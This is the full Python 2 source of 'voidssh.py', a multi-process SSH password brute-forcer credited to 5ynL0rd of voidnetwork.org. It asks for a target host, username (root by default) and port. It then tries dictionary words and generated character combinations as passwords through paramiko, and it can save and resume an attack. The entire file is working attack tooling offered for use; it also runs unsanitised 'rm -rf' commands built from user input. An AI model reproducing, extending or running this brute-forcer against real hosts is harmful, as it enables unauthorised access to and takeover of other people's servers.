#!/usr/bin/python
# voidssh.py v0.1
# ssh bruteforcer
#
# features:
# - multiprocessing (max 4 thread process/void method)
# - brute with string generator
# - brute with dictionary
# - brute with void method (combine dictionary searching with string generator)
# - saving & loading state
#
# if u have found bugs or any feedback please contact root@voidnetwork.org
# c0der: 5ynL0rd
# http://voidnetwork.org
#
# recommended information:
# - python 2.6.5
# - running with sudo (GNU/Linux)

import string
import os
from time import sleep
import sys
from multiprocessing import Process
import tarfile
from commands import getoutput
from re import search
from re import split
from itertools import product
from base64 import b16decode as voidnetwork
from base64 import b16encode as v_enc

__VERSION__ = 'v0.1'
__AUTHOR__ = voidnetwork('35796E4C307264')
__CONTACT__ = voidnetwork('726F6F7440766F69646E6574776F726B2E6F7267')
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_GREENS = '\033[95m'
C_BORD = '\033[41m'
C_NONE = '\033[0m'

def paramiko_installer():
    check_welcome = 'checking paramiko module..\n'
    for i in check_welcome:
        print '\b%s'%i,
        sys.stdout.flush()
        sleep(0.02)
    try:
        import paramiko
        global paramiko
    except:
        print 'module not found!\nInstallation module.. please wait..'
        x = tarfile.open('paramiko-1.7.6.tar.gz')
        x.extractall()
        x.close()
        os.chdir('paramiko-1.7.6/')
        os.system('python setup.py build')
        os.system('python setup.py install')
    else:
        print 'paramiko module has been installed!'
        sleep(1)

def banner(): 
    if os.name == "posix": 
        os.system("clear") 
    else: 
        os.system("cls") 
    print ''' 
 ___________________________________________________________
| %svoidssh.py  %s                         c0der: %s%s   |
| %s``````````````````          contact: %s%s |
|                                                           |
| SSH password searching tools                              |
| method: - dictionary searching                            |
|         - string generator searching                      |
|         - void method (multiple searching)                |
| new features:                                             |
|         - saving & loading state                          |
|___________________________________________________________|
|                  %shttp://voidnetwork.org%s                   |
|________%sNetwork_Programming_Research_&_Development%s_________|

'''%(C_RED,__VERSION__,__AUTHOR__,C_NONE,C_RED,__CONTACT__,C_NONE,C_BORD,C_NONE,C_RED,C_NONE)

def synL0rd_perm(s,n): 
    x = (s,)*n 
    return product(*x) 


def mission_menu():
    print '''
[+] select mission options:
    0) new mission
    1) continue mission
    2) remove mission
    3) remove all mission
'''
    opt_mission = input('    choose mission options [0,1..3]: ')
    return opt_mission

def option_method():
    print '''
[+] searching method:
    0) dictionary
    1) string generator
    2) void method (freak method)
'''
    option = input('    choose searching method [0,1,2]: ')
    return option


def dix(combine=False):
    dict_file = raw_input('[+] path of dictionary file: ')
    try:
        dix_file = open(dict_file,'r')
    except:
        print '%s[-] FAILED: File doesn\'t exist%s'%(C_RED,C_NONE)
        sys.exit(1)
    else:
        dix_ori = []
        dix_rev = []
        i = 0
        j = 0
        dix_word = dix_file.readlines()
        while i < len(dix_word):
            dix_ori.append(dix_word[i][:-1])
            i += 1
        dix_word.reverse()
        while j < len(dix_word):
            dix_rev.append(dix_word[j][:-1])
            j += 1
        print '%s[+] SUCCESS: loaded %s word%s'%(C_GREEN,len(dix_word),C_NONE)
        auth = auth_data()
        dix = [dix_ori, dix_rev]
        if combine == True:
            format_str_gen()
            str_gen(combine=True, d=dix, auth=auth, d_file=dict_file)
        else:
            running_op_1(auth, dix, dict_file)
        
        
def dix_spit(host, user, port, dix, id, dfile, load=False, *args):
    len_dix = len(dix)
    if len_dix % 2 == 1:
        len_use = len_dix/2 + 1
    elif len_dix == 1:
        len_use = 1
    else:
        len_use = len_dix/2
    if load and args[0] in dix:
        state = dix.index(args[0])
    else:
        state = 0
    for i in dix[state:len_use]:
        try:
            TMP_DIX = open('dix%s.tmp'%id, 'w')
            TMP_DIX.write('%s:%s:%s:%s:%s'%(v_enc(host),v_enc(user),v_enc(str(port)),v_enc(dfile),v_enc(i)))
            TMP_DIX.close()
            print "    %s<thread dict atk %s>:%s %s"%(C_GREENS,id,C_NONE,i)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host,username=user, password=i, port=int(port))
        except:
            pass
        else:
            ssh.close()
            print '%s(pass: %s) SSH PASSWORD found!!%s'%(C_GREEN,i,C_NONE)
            sys.exit(1)
    print '%s[-] dictionary thread %s search finished%s'%(C_RED,id,C_NONE)
    sys.exit(0)

def format_str_gen(): 
    print '''[+] Select generator: 
    0) a-z (abcdefghijklmnopqrstuvwxyz) 
    1) 0-9 (0123456789) 
    2) A-Z (ABCDEFGHIJKLMNOPQRSTUVWXYZ) 
    3) !-~ (!"#$%&\\\'()*+,-./:;<=>?@[\\\\]^_`{|}~) 
    4) a-z and 0-9 
    5) a-z and A-Z
    6) a-z and !-~ 
    7) a-z and A-Z and 0-9 
    8) a-z and A-Z and !-~ 
    9) all''' 
    
def auth_data(combine=False):
    if combine == True:
        pass
    else:
        data = []
        host = raw_input("[+] host target: ")
        user = raw_input("[+] ssh username(default:root): ")
        port = raw_input("[+] ssh port(default:22): ")
        if user == '':
            user = "root"
        try:
            port = int(port)
        except:
            pass
        if port == '':
            port = 22
        data.append(host)
        data.append(user)
        data.append(port)
        return data
    
def spit(lengthmin, lengthmax, host, user, port, listnum, limiter, th, load=False, *args):
    enc_1 = v_enc(str(lengthmin))
    enc_2 = v_enc(str(lengthmax))
    enc_3 = v_enc(host)
    enc_4 = v_enc(user)
    enc_5 = v_enc(str(port))
    enc_6 = v_enc(string.join(listnum,''))
    enc_7 = v_enc(str(limiter))
    lengthmax = int(lengthmax)
    limiter = int(limiter)
    port = int(port)
    if load:
        lengthmin = len(args[0])
    else:
        lengthmin = int(lengthmin)
    while lengthmin <= lengthmax:
        if load:
            state = args[0]
            passes = False
        else:
            state = listnum[0]*lengthmin
            passes = True
        found = False
        ch3cksum = synL0rd_perm(listnum,lengthmin)
        limit_high = listnum[limiter]*lengthmax
        limit_low = listnum[limiter]*lengthmin
        print "\r",
        while 1:
            try:
                if string.join(ch3cksum.next(),"") == state:
                    while found == False:
                        if passes:
                            resgen = state
                            passes = False
                        else:
                            resgen = string.join(ch3cksum.next(),'')
                        try:
                            TMP_GEN = open('gen%s.tmp'%th,'w')
                            TMP_GEN.write('%s:%s:%s:%s:%s:%s:%s:%s'%(enc_1,enc_2,enc_3,enc_4,enc_5,enc_6,
                                                                     enc_7,v_enc(resgen)))
                            TMP_GEN.close()
                            print "    %s<thread strgen atk %s>:%s %s"%(C_GREEN,th,C_NONE,resgen)
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(host,username=user, password=resgen, port=port)
                        except:
                            if resgen == limit_high:
                                print '%s[-] string generator thread %s search finished%s'%(C_RED,th,C_NONE)
                                sys.exit(0)
                                break
                            if resgen == limit_low:
                                passes = True
                                lengthmin += 1
                                break
                            else:
                                pass
                        else:
                            found = True
                            ssh.close()
                            print '%s(pass: %s) SSH PASSWORD found!!%s'%(C_GREEN,resgen,C_NONE)
                            sys.exit(1)
            except StopIteration:
                break

def str_gen(combine=False, **kwargs): 
    if combine==True:
        dix = kwargs['d']
    try: 
        gen = input("    choose number options [1,2,..10]: ") 
    except: 
        print "%s[-] Error input!%s"%(C_RED,C_NONE) 
        sys.exit(1) 
    else: 
        if gen > 9 or gen < 0: 
            print "%s[-] Error input!%s"%(C_RED,C_NONE) 
            sys.exit(1) 
        lengthmin2 = 0
    lengthmin = input("[+] length min: ")
    lengthmax = input("[+] length max: ") 
    if lengthmin > lengthmax: 
        print "%s[-] Error input!%s"%(C_RED,C_NONE)  
        sys.exit(1)
    if combine == True:
        auth = kwargs['auth']
    else:
        auth = auth_data()
    num0 = list(string.ascii_lowercase) 
    num1 = list(string.digits) 
    num2 = list(string.ascii_uppercase) 
    num3 = list(string.punctuation) 
    num4 = num0+num1 
    num5 = num0+num2 
    num6 = num0+num3 
    num7 = num0+num2+num1 
    num8 = num0+num2+num3 
    full = num0+num2+num1+num3 
    listnum = [num0,num1,num2,num3,num4,num5,num6,num7,num8,full]
    print "    Host: %s"%auth[0]
    print "    User: %s"%auth[1]
    print "    Port: %s"%auth[2]
    print "[o] Password searching. Please wait...\n    press %s<ctrl+C>%s for saving the state"%(C_GREEN,C_NONE)
    if os.name == 'posix':
        paramiko.util.log_to_file('/tmp/paramiko.log')
    else:
        paramiko.util.log_to_file('paramiko.log')
    limiter1 = len(listnum[gen])/2-1
    limiter2 = len(listnum[gen])/2
    pattern_ori = []
    pattern_rev = listnum[gen]
    i = 0
    while i < len(listnum[gen]):
        pattern_ori.append(listnum[gen][i])
        i += 1
    pattern_rev.reverse()
    limiter = [limiter1, limiter2]
    pattern = [pattern_ori, pattern_rev]
    length = [lengthmin, lengthmax]
    if combine==True:
        running_op_2(l=length, a=auth, p=pattern, lim=limiter, d=dix, d_file=kwargs['d_file'])
    else:
        running_op_0(length, auth, pattern, limiter)


def running_op_2(**kwargs):
    length = kwargs['l']
    auth = kwargs['a']
    pattern = kwargs['p']
    limiter = kwargs['lim']
    dfile = kwargs['d_file']
    dix = kwargs['d']
    try:
        kwargs['load']
    except:
        list_args1 = [length[0], length[1], auth[0], auth[1], auth[2], pattern[0], limiter[0], 1]
        list_args2 = [length[0], length[1], auth[0], auth[1], auth[2], pattern[1], limiter[0], 2]
        spit1 = Process(target=spit, args=list_args1)
        spit2 = Process(target=spit, args=list_args2)
        spit3 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[0], 3, dfile])
        spit4 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[1], 4, dfile])
    else:
        load = kwargs['load']
        state = kwargs['state']
        list_args1 = [length[0], length[1], auth[0], auth[1], auth[2], pattern[0], limiter[0], 1, load, state[1][0]]
        list_args2 = [length[0], length[1], auth[0], auth[1], auth[2], pattern[1], limiter[0], 2, load, state[1][1]]
        spit1 = Process(target=spit, args=list_args1)
        spit2 = Process(target=spit, args=list_args2)
        spit3 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[0], 3, dfile, load, state[0][0]])
        spit4 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[1], 4, dfile, load, state[0][1]])
    spitter = [spit1,spit2,spit3,spit4]
    for i in spitter:
        i.start()
    while 1:
        try:
            if spit1.exitcode == 1 or spit2.exitcode == 1:
                for i in spitter:
                    i.terminate()
                break
            if spit3.exitcode == 1 or spit4.exitcode == 1:
                for i in spitter:
                    i.terminate()
                break
        except KeyboardInterrupt:
            for i in spitter:
                    i.terminate()
            saving = raw_input('%s[-] Do you want to saving this state [y/n]?: %s'%(C_GREEN,C_NONE))
            if saving == 'y' or saving == 'Y':
                save_name = raw_input('    save name: ')
                for i in range(1,3):
                    os.system('mv gen%s.tmp %sgen%s.tmp'%(i,save_name,i))
                for i in range(3,5):
                    os.system('mv dix%s.tmp %sdix%s.tmp'%(i,save_name,i))
                print '    %sSAVING....%s\n'%(C_BORD,C_NONE)
            os.system('rm -rf gen*.tmp')
            os.system('rm -rf dix*.tmp')
            print '%s[-] Thanks for using voidnetwork tools%s'%(C_BORD,C_NONE)
            break
         

def running_op_0(length, auth, pattern, limiter, *args):
    try:
        args[0]
    except:
        t1 = Process(target=spit, args=[length[0], length[1], auth[0], auth[1], auth[2], pattern[0], 
                                        limiter[0], 1])
        t2 = Process(target=spit, args=[length[0], length[1], auth[0], auth[1], auth[2], pattern[1], 
                                        limiter[0], 2])
    else:    
        t1 = Process(target=spit, args=[length[0], length[1], auth[0], auth[1], auth[2], pattern[0], 
                                        limiter[0], 1, True, args[1][0]])
        t2 = Process(target=spit, args=[length[0], length[1], auth[0], auth[1], auth[2], pattern[1], 
                                        limiter[0], 2, True, args[1][1]])
    t1.start()
    t2.start()
    while 1:
        try:
            if t1.exitcode == 1:
                t2.terminate()
                break
            if t2.exitcode == 1:
                t1.terminate()
                break
        except KeyboardInterrupt:
            t1.terminate()
            t2.terminate()
            saving = raw_input('%s[-] Do you want to saving this state [y/n]?: %s'%(C_GREEN,C_NONE))
            if saving == 'y' or saving == 'Y':
                save_name = raw_input('    save name: ')
                os.system('mv gen1.tmp %sgen1.tmp'%save_name)
                os.system('mv gen2.tmp %sgen2.tmp'%save_name)
                print '    %sSAVING....%s\n'%(C_BORD,C_NONE)
            else:
                os.system('rm -rf gen*.tmp')
            print '%s[-] Thanks for using voidnetwork tools%s'%(C_BORD,C_NONE)
            break

def running_op_1(auth, dix, dfile, *args):
    try:
        args[0]
    except:
        th1 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[0], 3, dfile])
        th2 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[1], 4, dfile])
    else:
        th1 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[0], 3, dfile, True, args[1][0]])
        th2 = Process(target=dix_spit, args=[auth[0], auth[1], auth[2], dix[1], 4, dfile, True, args[1][1]])
    print "[o] Password searching. Please wait...\n    press %s<ctrl+C>%s for saving the state"%(C_GREEN,C_NONE)
    th1.start()
    th2.start()
    while 1:
        try:
            if th1.exitcode == 1:
                th2.terminate()
                break
            if th2.exitcode == 1:
                th1.terminate()
                break
        except KeyboardInterrupt:
            th1.terminate()
            th2.terminate()
            saving = raw_input('%s[-] Do you want to saving this state [y/n]?: %s'%(C_GREEN,C_NONE))
            if saving == 'y' or saving == 'Y':
                save_name = raw_input('    save name: ')
                os.system('mv dix3.tmp %sdix3.tmp'%save_name)
                os.system('mv dix4.tmp %sdix4.tmp'%save_name)
                print '    %sSAVING....%s\n'%(C_BORD,C_NONE)
            else:
                os.system('rm -rf dix*.tmp')
            print '%s[-] Thanks for using voidnetwork tools%s'%(C_BORD,C_NONE)
            break  

class load_mission:
    def __init__(self):
        self.c = 0
        self.listing_name = []
        self.ls1 = []
        self.ls2 = []
        self.ls3 = []
        self.ls4 = []
 
    def load_list(self, opt):
        self.loadlist = getoutput('ls -l *.tmp')
        if opt == 1:
            print '[+] select data mission for continue:'
        elif opt == 2:
            print '[+] select data mission for remove: '
        if search('No such file or directory', self.loadlist):
            print '\n    %s--NO MISSION--%s\n'%(C_RED,C_NONE)
            sys.exit(0)
        else:
            self.parse = split('\n',self.loadlist)
            for i in self.parse:
                self.name = split(' ',i)[-1][:-8]
                self.listing_name.append(self.name)
            for j in self.listing_name:
                amount = self.listing_name.count(j)
                for m in range(amount-1):
                    try:
                        self.listing_name.remove(j)
                    except:
                        pass
            for i in self.listing_name: 
                print '    %s) %s'%(self.c,i)
                self.c += 1
            self.choose = input('\n    choose your data mission [0,1,2..]: ')
            return self.listing_name[self.choose]
    def list_state(self, data):
        try:
            self.t1 = open('%sgen1.tmp'%data,'r').read()
            self.t2 = open('%sgen2.tmp'%data,'r').read()
        except:
            try:
                self.t3 = open('%sdix3.tmp'%data,'r').read()
                self.t4 = open('%sdix4.tmp'%data,'r').read()
            except:
                pass
            else:
                self.data_dix3 = split(':',self.t3)
                self.data_dix4 = split(':',self.t4)
                print '    %s<dictionary method data selected>%s'%(C_BORD,C_NONE)
                for i in self.data_dix3:
                    self.ls3.append(voidnetwork(i))
                for j in self.data_dix4:
                    self.ls4.append(voidnetwork(j))
                try:
                    dict_file = open(self.ls3[3],'r').read()
                    dict_file = split('\n',dict_file)[:-1]
                except:
                    print '[-] Sorry your dictionary list not exist'
                    sys.exit(0)
                else:
                    dix_ori = []
                    dix_rev = []
                    i = 0
                    j = 0
                    while i < len(dict_file):
                        dix_ori.append(dict_file[i])
                        i += 1
                    dict_file.reverse()
                    while j < len(dict_file):
                        dix_rev.append(dict_file[j])
                        j += 1
                    dix = [dix_ori, dix_rev]
                    state = [self.ls3[4],self.ls4[4]]
                    running_op_1(self.ls3[0:3], dix, self.ls3[3], True, state)
        else:
            try:
                self.t3 = open('%sdix3.tmp'%data,'r').read()
                self.t4 = open('%sdix4.tmp'%data,'r').read()
            except:
                self.data_gen1 = split(':',self.t1)
                self.data_gen2 = split(':',self.t2)
                print '    %s<string generator method data selected>%s'%(C_BORD,C_NONE)
                print '%sSUCCESS: Continue state...%s'%(C_GREEN,C_NONE)
                for i in self.data_gen1:
                    self.ls1.append(voidnetwork(i))
                for j in self.data_gen2:
                    self.ls2.append(voidnetwork(j))
                self.pattern_ori = []
                self.pattern_rev = list(self.ls1[5])
                i = 0
                while i < len(list(self.ls1[5])):
                    self.pattern_ori.append(list(self.ls1[5])[i])
                    i += 1
                self.pattern_rev.reverse()
                self.pattern = [self.pattern_ori, self.pattern_rev]
                self.state = [self.ls1[7],self.ls2[7]]
                running_op_0(self.ls1[0:2],self.ls1[2:5],self.pattern,self.ls1[6], True, self.state)
            else:
                self.data_gen1 = split(':',self.t1)
                self.data_gen2 = split(':',self.t2)
                self.data_dix3 = split(':',self.t3)
                self.data_dix4 = split(':',self.t4)
                print '    %s<void method data selected>%s'%(C_BORD,C_NONE)
                print '%sSUCCESS: Continue state...%s'%(C_GREEN,C_NONE)
                for i in self.data_gen1:
                    self.ls1.append(voidnetwork(i))
                for j in self.data_gen2:
                    self.ls2.append(voidnetwork(j))
                self.pattern_ori = []
                self.pattern_rev = list(self.ls1[5])
                i = 0
                while i < len(list(self.ls1[5])):
                    self.pattern_ori.append(list(self.ls1[5])[i])
                    i += 1
                self.pattern_rev.reverse()
                self.pattern = [self.pattern_ori, self.pattern_rev]
                self.state = [self.ls1[7],self.ls2[7]]
                # --
                for i in self.data_dix3:
                    self.ls3.append(voidnetwork(i))
                for j in self.data_dix4:
                    self.ls4.append(voidnetwork(j))
                try:
                    dict_file = open(self.ls3[3],'r').read()
                    dict_file = split('\n',dict_file)[:-1]
                except:
                    print '[-] Sorry your dictionary list not exist'
                    sys.exit(0)
                else:
                    dix_ori = []
                    dix_rev = []
                    i = 0
                    j = 0
                    while i < len(dict_file):
                        dix_ori.append(dict_file[i])
                        i += 1
                    dict_file.reverse()
                    while j < len(dict_file):
                        dix_rev.append(dict_file[j])
                        j += 1
                    self.dix = [dix_ori, dix_rev]
                    self.state_op_1 = [self.ls3[4],self.ls4[4]]
                self.states = [self.state_op_1, self.state]
                running_op_2(l=self.ls1, a=self.ls3 , p=self.pattern, lim=[int(self.ls1[6]),
                             int(self.ls1[6])+1], d=self.dix, d_file=self.ls3[3], load=True, state=self.states)

def voidssh():
    paramiko_installer()
    banner()
    opt_mission = mission_menu()
    load = load_mission()
    if opt_mission == 0:
        opt = option_method()
        if opt == 0:
            dix()
        elif opt == 1:
            format_str_gen()
            str_gen()
        elif opt == 2:
            dix(combine=True)
        else:
            print "Stupid input"
            sys.exit(0)
    elif opt_mission == 1:
        choose = load.load_list(opt_mission)
        list_state = load.list_state(choose)
    elif opt_mission == 2:
        choose = load.load_list(opt_mission)
        print "    %sREMOVING MISSION...%s"%(C_BORD,C_NONE)
        os.system('rm -rf %s*.tmp'%choose)
    elif opt_mission == 3:
        print "    %sREMOVING ALL MISSION...%s"%(C_BORD,C_NONE)
        os.system('rm -rf *.tmp')
        
if "__main__" == __name__:
    try:
        voidssh()
    except KeyboardInterrupt:
        print '\n%s[-] Thanks for using voidnetwork tools%s'%(C_BORD,C_NONE)
        sys.exit(0)
        

